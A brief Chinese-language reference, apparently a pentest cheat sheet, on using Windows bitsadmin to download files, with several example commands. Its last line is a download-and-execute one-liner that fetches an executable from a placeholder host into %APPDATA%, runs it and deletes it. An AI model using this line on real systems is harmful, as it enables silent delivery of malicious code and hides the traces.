bitsadmin命令（只能命令下载到已存在的路径上，win7以上）：

https://www.cnblogs.com/hookjoy/p/6550992.html

https://xz.aliyun.com/t/1654/



1.```bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip e:\p.zip```

2.```bitsadmin /rawreturn /transfer getpayload http://download.sysinternals.com/files/PSTools.zip e:\p.zip```

3.带进度条

```bitsadmin /transfer myDownLoadJob /download /priority normal "http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg" "e:\abc.jpg"```

4.多条命令
 
``` 
bitsadmin /create myDownloadJob
bitsadmin /addfile myDownloadJob http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg e:\abc.jpg
bitsadmin /resume myDownloadJob
bitsadmin /info myDownloadJob /verbose
bitsadmin /complete myDownloadJob
```


bitsadmin /transfer d90f <http://site.com/a> %APPDATA%\d90f.exe&%APPDATA%\d90f.exe&del %APPDATA%\d90f.exe
